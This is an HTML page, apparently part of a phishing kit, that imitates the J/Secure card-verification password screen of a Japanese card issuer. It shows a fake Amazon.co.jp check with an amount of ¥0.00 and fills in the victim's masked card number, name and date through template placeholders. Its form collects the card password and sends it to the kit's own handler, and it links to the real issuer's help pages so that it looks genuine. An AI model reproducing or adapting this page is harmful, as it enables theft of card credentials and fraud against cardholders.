
<html><head>
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link href="card/a3/ntt.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" type="text/css" href="card/a3/foundation_V_PC.css">
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />
    <title>
        J/Secure
    </title>
    <script src="../js/jquery.min.js"></script>
    <script src="../js/jquery.validate.min.js"></script>
    <script src="../js/sire.form.js"></script>
</head>

<body onload="SetFocus()" bgcolor="#ffffff">

<script language="Javascript">
    function SetFocus()
    {
        document.formvbv.passvbv.focus();
    }
    function ForgotPassword()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/dispatcher.jsp","forgotPasswordWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Help()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/help_smcc_m.jsp","helpWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Cancel()
    {
        history.back();
    }
</script>

<form method="post" id="formvbv" name="formvbv" action="">
    <center>
        <table cellpadding="0" cellspacing="0" border="0">
            <tbody><tr>
                <td>
                    <table cellpadding="0" cellspacing="0" border="0" width="350px">
                        <tbody><tr>
                            <td valign="top">


                                <table cellpadding="0" cellspacing="0" border="0" width="100%">
                                    <tbody><tr>
                                        <td>
                                            <table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
                                                <tbody><tr>
                                                    <td align="left" width="50%">
                                                        <img src="card/a3/${image!'all.jpg'}" border="0" alt="J/Secure" title="J/Secure">
                                                    </td>

                                                    <td align="right" width="50%">

                                                    </td>
                                                </tr>
                                                </tbody></table>
                                            <br>
                                        </td>
                                    </tr>
                                    </tbody></table>
                                <div class="protection">Added Protection</div>
                                <div class="message">お客様のご利用カード会社インターネットサービスパスワードをご入力ください。</div>

                                <table cellpadding="3" cellspacing="0" border="0" width="100%">
                                    <tbody>
                                    <tr>
                                        <td align="left" height="10"><img src="card/a3/spacer.gif" height="10" width="1"></td>
                                    </tr>
                                    <tr>
                                        <td valign="top" align="left">
                                            <table cellpadding="3" cellspacing="0" border="0" width="100%">

                                                <tbody><tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        店舗名:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                        Amazon.co.jp検証
                                                    </td>
                                                </tr><tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        金額:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                        ¥0.00
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        日付:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                    ${dateTime!''}                </td>
                                                </tr>
                                                <tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        カード番号:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                        **** **** **** ${cardNo!''}                </td>
                                                </tr>
                                                <tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        カード名義人：
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                    ${cardName!''}
                                                    </td>
                                                </tr>

                                                <tr>
                                                    <td class="normalgray" valign="center" width="165px" align="right">
                                                        パスワード:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" width="165px">
                                                        <!-- no errors, retain password -->

                                                        <input type="password" maxlength="32" size="20" id="passvbv" name="passvbv" value="" autocomplete="off" minlength="6" >

                                                    </td>

                                                </tr>



                                                <tr>
                                                    <td>&nbsp;</td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" align="left">
                                                        <a class="forgotlink" href="javascript:ForgotPassword()">
                                                            パスワードを忘れた場合は
                                                        </a>
                                                    </td>
                                                </tr>

                                                <tr height="10">
                                                    <td><img src="card/a3/spacer.gif"></td>
                                                </tr>
                                                <tr>

                                                    <td valign="top" align="left">&nbsp;</td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" align="left" width="165px">

                                                        <table cellpadding="0" cellspacing="0" border="0" width="165px">
                                                            <tbody><tr>
                                                                <td nowrap="">
                                                                    <input type="submit" id="sendButton" value="送信">
                                                                </td>
                                                                <td nowrap="">
                                                                    <a class="normallink" href="javascript:Help()">
                                                                        <img height="12" width="12" src="card/a3/help.jpg" border="0" alt="ヘルプ" title="ヘルプ">
                                                                    </a>

                                                                </td>
                                                                <td nowrap="">
                                                                    <a class="normallink" href="javascript:Help()">
                                                                        <font class="normallink">ヘルプ</font>
                                                                    </a>

                                                                </td>
                                                                <td nowrap="">
                                                                    <a class="normallink" href="javascript:Cancel()">
                                                                        <font class="normallink">キャンセル</font>
                                                                    </a>

                                                                </td>
                                                            </tr>
                                                            </tbody></table>

                                                    </td>

                                                </tr>

                                                </tbody></table>
                                        </td>
                                    </tr>
                                    </tbody></table>



                            </td></tr><tr>
                        </tr></tbody></table><table cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
                    <tbody><tr>
                        <td class="copyright" align="center">

                        </td>
                    </tr>
                    </tbody></table>
                </td></tr>

            </tbody></table>

    </center>

</form>

</body></html>